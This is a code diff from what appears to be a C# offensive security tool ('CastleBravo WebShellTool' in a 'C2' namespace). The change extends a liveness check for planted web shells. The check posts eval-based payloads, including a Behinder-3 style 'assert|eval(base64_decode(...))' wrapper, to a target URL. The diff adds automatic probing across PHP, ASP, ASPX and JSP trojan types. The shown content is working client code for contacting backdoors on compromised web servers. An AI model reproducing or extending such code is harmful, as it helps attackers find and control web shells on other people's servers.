@@ -595,21 +595,50 @@ namespace C2.Business.CastleBravo.WebShellTool
             {
                 string url = NetUtil.FormatUrl(task.Url);
                 string seed = RandomUtil.RandomInt(31415000, 31415926).ToString();
-                string result = WebClientEx.Post(url, GenBehinder3Payload(task, seed), 1500, Proxy);
-                return result.Contains(seed);
+                string result = "";
+                if (task.TrojanType != "自动判断")
+                {
+                    result = WebClientEx.Post(url, GenBehinder3Payload(task, seed), 1500, Proxy);
+                    return result.Contains(seed);
+                }
+                else
+                { 
+                    foreach(string type in Global.TrojanTypes)
+                    {
+                        result = WebClientEx.Post(url, GenBehinder3Payload(task, seed, type), 1500, Proxy);
+                        if (result.Contains(seed))
+                            return true;
+                    }
+                    return false;
+                }
+
             }
             catch { return false; }
 
         }
-        private string GenBehinder3Payload(WebShellTaskConfig task, string seed)
+        private string GenPayload(string trojanType, string seed)
         {
-            string pass = task.Password;          
-            string php = string.Format("print({0});", seed);
-            string asp = string.Format("response.write({0})", seed);
+            switch (trojanType)
+            {
+                case "phpEval":
+                    return string.Format("print({0});", seed);
+                case "aspEval":
+                    return string.Format("response.write({0})", seed);
+                case "aspxEval":
+                     return string.Format("response.write({0})", seed);
+                case "jspEval":
+                    return string.Format("out.println({0})", seed);
+                default:
+                    return string.Format("print({0});", seed);
+
+            }
+        }
+        private string GenBehinder3Payload(WebShellTaskConfig task, string seed,string giventype ="")
+        {
+            string pass = task.Password;
             // 默认按php算
-            string payload = task.TrojanType == "phpEval" ? php :
-                             task.TrojanType == "aspEval" ? asp :
-                             php;
+            string payload = giventype.IsNullOrEmpty() ? GenPayload(task.TrojanType, seed) :
+                             GenPayload(giventype, seed);
             if (task.ClientVersion == "三代冰蝎") //目前只支持冰蝎php、aes加密报文
             {
                 string behinderPayload = string.Format("assert|eval(base64_decode('{0}'));", ST.EncodeBase64(payload));
